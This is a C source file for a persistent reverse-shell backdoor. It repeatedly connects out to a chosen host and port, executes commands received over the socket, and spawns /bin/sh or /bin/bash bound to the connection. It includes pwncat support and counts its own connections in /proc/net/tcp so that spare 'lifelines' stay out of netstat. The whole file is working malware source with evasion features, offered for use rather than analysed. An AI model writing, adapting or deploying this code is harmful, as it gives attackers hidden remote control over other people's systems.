#define _GNU_SOURCE

#include <arpa/inet.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

#include "reverse.h"
const char *PROC_NET_TCP = "/proc/net/tcp";
const char *PWNCAT_INIT = " echo; echo ";
const char *CMD_POSTFIX = " 2>&1";

void reverse_shell(const char *host, unsigned int port, unsigned int num_shells) {
    int sock;
    char input[256];
    struct sockaddr_in client;

    client.sin_family = AF_INET;
    client.sin_addr.s_addr = inet_addr(host);
    client.sin_port = htons(port);

    while (1) {
        sock = socket(AF_INET, SOCK_STREAM, 0);
        // Try connecting every few seconds.
        // Our listener might not always be available
        // If we set a shell limit, keep waiting until we have a free slot
        //
        // BUG; sure, this doesn't do any fancy mutual exclusion, but it should at
        // least hide some of our lifelines by keeping them out of netstat.
        int conn = -1;
        while (conn != 0) {
            if (num_shells == 0 || num_current_connections(host, port) < num_shells) {
                conn = connect(sock, (struct sockaddr *)&client, sizeof(client));
            }
            // If we didn't establish a connection in the previous step, sleep for a bit
            if (conn != 0) {
                sleep(5);
            }
        }

        // Send a message to indicate a socket just connected.
        // Helpful when using a simple `nc` listener
        send(sock, "Connected!\n", strlen("Connected!\n"), 0);

        int firstCommand = 1;
        while (read(sock, input, sizeof(input) - sizeof(CMD_POSTFIX) - 1) > 0) {
            // Hacky pwncat compatibility
            if (firstCommand && strncmp(PWNCAT_INIT, input, strlen(PWNCAT_INIT)) == 0) {
                // Cut the command at the newline
                char *enter = strstr(input, "\n");
                *enter = 0x00;
                // Break into a reverse shell and execute the command we just received
                reverse_shell_classic(sock, "/bin/bash", input);
                break;
            }
            // "!shell" drops you into a more "usable" shell
            if (strncmp("!shell", input, strlen("!shell")) == 0) {
                // Call will create a new process that uses `sock` as a reverse shell.
                reverse_shell_classic(sock, "/bin/sh", NULL);
                // Our parent process needs to break out of this while loop to free up `sock`.
                // This will cause the parent process to begin monitoring /proc/net/tcp again
                break;
            } else {
                handle_cmd(sock, input);
            }
            firstCommand = 0;
        }
        close(sock);
    }
}

void handle_cmd(int sock, char *input) {
    char output[256];
    // Add a postfix to the command to redirect stderr to stdout, s.t.
    // it is also picked up by fgets
    char *enter = strstr(input, "\n");
    strcpy(enter, CMD_POSTFIX);
    FILE *fp = popen(input, "r");
    while (fgets(output, sizeof(output), fp) != NULL) {
        send(sock, output, strlen(output) + 1, 0);
    }
    pclose(fp);
}

void reverse_shell_classic(int sock, char *shell, char *cmd) {
    // Construct a string that looks like "cmd; shell"
    char cmd_shell[276] = "";
    if (cmd && strlen(cmd) + strlen(shell) + 1 < sizeof(cmd_shell)) {
        strncpy(cmd_shell, cmd, strlen(cmd));
        strcat(cmd_shell, ";");
        strcat(cmd_shell, shell);
    } else {
        // If we didn't receive a command to execute, just launch the shell
        strncpy(cmd_shell, shell, strlen(shell));
    }

    // Create a fork s.t. one process will be replaced by a shell,
    // while the other one can return to the reconnect loop
    int pid = fork();
    if (pid != 0) {
        dup2(sock, 0);
        dup2(sock, 1);
        dup2(sock, 2);
        // execute the command, then drop in to a reverse shell
        char *args[] = {shell, "-c", cmd_shell, NULL};
        execv(args[0], args);
    }
}

// Read the current number of reverse shells we've got going at the moment.
//
// Can be used to keep other lifeline threads hidden by not causing net traffic
int num_current_connections(const char *host, unsigned int port) {
    unsigned int occurrences = 0;

    int host_int = inet_addr(host);

    FILE *tcp_file = fopen(PROC_NET_TCP, "r");
    if (tcp_file == NULL) {
        return -1;
    }
    char line[256];

    unsigned int i = 0;
    while (fgets(line, sizeof(line), tcp_file) != NULL) {
        // First line skipped, since it's a header
        if (i != 0) {
            int line_host, line_port, state;
            sscanf(line, "%*d: %*X:%*X %X:%X %X %*512s\n", &line_host, &line_port, &state);
            // ... We want to spin up a new shell if we're not in ESTABLISHED, SYN_RECEIVED or
            // SYN_SEND
            if (line_host == host_int && line_port == port &&
                (state == 1 || state == 2 || state == 3)) {
                occurrences += 1;
            }
        }
        i += 1;
    }
    return occurrences;
}
